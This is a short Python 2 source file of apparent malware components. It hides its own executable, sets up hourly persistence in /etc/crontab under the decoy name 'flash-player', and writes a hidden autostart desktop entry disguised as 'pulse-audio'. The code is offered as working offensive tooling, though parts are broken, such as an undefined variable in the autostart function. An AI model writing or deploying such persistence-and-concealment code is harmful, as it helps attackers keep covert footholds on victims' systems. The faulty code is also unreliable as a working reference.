import os
import sys
import subprocess
import string


'obfuscation'
# hidden_file
def add_hidden_file(value=None):
    try:
        value = sys.argv[0]
        if value and os.path.isfile(value):
            if os.name == 'nt':
                path = value
                hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
            else:
                dirname, basename = os.path.split(value)
                path = os.path.join(dirname, '.' + basename)
                hide = subprocess.call('cp {} {}'.format(value,path), shell=True) == 0
            return (True if hide else False)
        else:
            return (False)
    except:
        pass

# persistence on linux using cronjob...upcoming for mac
def add_crontab_job(value=None, minutes=10, name='flash-player'):
    if sys.platform == 'linux2':
        value = os.path.abspath(sys.argv[0])
        if value and os.path.isfile(value):
            path = value
            task = '0 * * * * {}'.format(path) # runs once an hour(every hour at zero minute)
            with open('/etc/crontab', 'r') as fp:
                data = fp.read()
            if task not in data:
                with open('/etc/crontab', 'a') as fd:
                    fd.write('\n{}\n'.format(task))
            return True

# adding a startup application for linux
# auto startup script linux
script = string.Template('''

[Desktop Entry]
Encoding=UTF-8
Type=Application
Terminal=false
Exec=${PATH}
Name=${NAME}
NoDisplay=true
Hidden=true
NotShowIn='XDG_CURRENT_DESKTOP'
StartupNotify=false

''')

def add_start_up(name='pulse-audio'):
    home = os.environ['HOME']
    dr = home+"/.config/autostart/"
    if not os.path.exists(dr):
        os.makedirs(dr)
    file = dr+name.lower()+".desktop"
    if not os.path.exists(file):
        with open(file, 'w') as out:
            out.write(script.substitute(PATH=path,NAME=name))

print os.environ['LOGNAME']